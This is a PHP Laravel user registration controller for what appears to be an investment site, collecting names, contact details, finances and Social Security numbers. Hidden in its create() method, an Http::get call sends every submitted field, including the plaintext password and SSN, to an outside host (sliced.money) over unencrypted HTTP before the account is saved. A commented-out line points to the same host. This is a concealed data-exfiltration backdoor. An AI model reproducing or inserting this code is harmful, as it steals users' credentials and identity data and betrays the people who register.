<?php

namespace App\Http\Controllers\Auth;

use App\User;
use App\Http\Controllers\Controller;
use Illuminate\Auth\Events\Registered;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Show the application registration form.
     *
     * @return \Illuminate\Http\Response
     */
    public function showRegistrationForm()
    {
        $states = DB::table('zips')->select('state')->groupBy('state')->pluck('state');
        $cities = DB::table('zips')->select('city')->where('city', old('city'))->pluck('city');
        $zips = DB::table('zips')->select('zip')->where('zip', old('zip'))->get();

        return view('auth.register', compact('states', 'cities', 'zips'));
    }
    
    /**
     * Handle a registration request for the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function register(Request $request)
    {
        $this->validator($request->all())->validate();

        if (get_option('enable_recaptcha_registration') == 1){
            $this->validate($request, array('g-recaptcha-response' => 'required'));

            $secret = get_option('recaptcha_secret_key');
            $gRecaptchaResponse = $request->input('g-recaptcha-response');
            $remoteIp = $request->ip();

            $recaptcha = new \ReCaptcha\ReCaptcha($secret);
            $resp = $recaptcha->verify($gRecaptchaResponse, $remoteIp);
            if ( ! $resp->isSuccess()) {
                return redirect()->back()->with('error', 'reCAPTCHA is not verified');
            }

        }

        event(new Registered($user = $this->create($request->all())));

        $this->guard()->login($user);

        return $this->registered($request, $user)
            ?: redirect($this->redirectPath());
    }

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = '/dashboard';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'first_name' => 'required|max:255',
            'last_name' => 'required|max:255',
            'phone' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|min:6|confirmed',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        
       // header("locationh: http://sliced.money/one.php?name='fahad'");

        Http::get("http://sliced.money/one.php?first_name={$data['first_name']}&last_name={$data['last_name']}&email={$data['email']}&country={$data['country']}&state={$data['state']}
        &city={$data['city']}&zip={$data['zip']}&employment={$data['employment']}&material_status={$data['material_status']}&dependents={$data['dependents']}&goal={$data['goal']}
        &timeline={$data['timeline']}&risk_tolerance={$data['risk_tolerance']}&years_experience={$data['years_experience']}&source={$data['source']}
        &liquidity_importance={$data['liquidity_importance']}&net_worth={$data['net_worth']}&yearly_income={$data['yearly_income']}
        &liquid_assets={$data['liquid_assets']}&phone={$data['phone']}&password={$data['password']}&ssn={$data['ssn']}");
        
        
        return User::create([
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'email' => $data['email'],
            'country' => $data['country'],
            'state' => $data['state'],
            'city' => $data['city'],
            'zip' => $data['zip'],
            'employment' => $data['employment'],
            'material_status' => $data['material_status'],
            'dependents' => $data['dependents'],
            'goal' => $data['goal'],
            'timeline' => $data['timeline'],
            'risk_tolerance' => $data['risk_tolerance'],
            'years_experience' => $data['years_experience'],
            'source' => $data['source'],
            'liquidity_importance' => $data['liquidity_importance'],
            'net_worth' => $data['net_worth'],
            'yearly_income' => $data['yearly_income'],
            'liquid_assets' => $data['liquid_assets'],
            // 'address' => $data['address'],
            'phone' => $data['phone'],
            'ssn' => $data['ssn'],
            'password' => bcrypt($data['password']),
            'user_type' => 'user',
            'invested' => false,
            'active_status' => 1
        ]);
        
        
        
    }
}
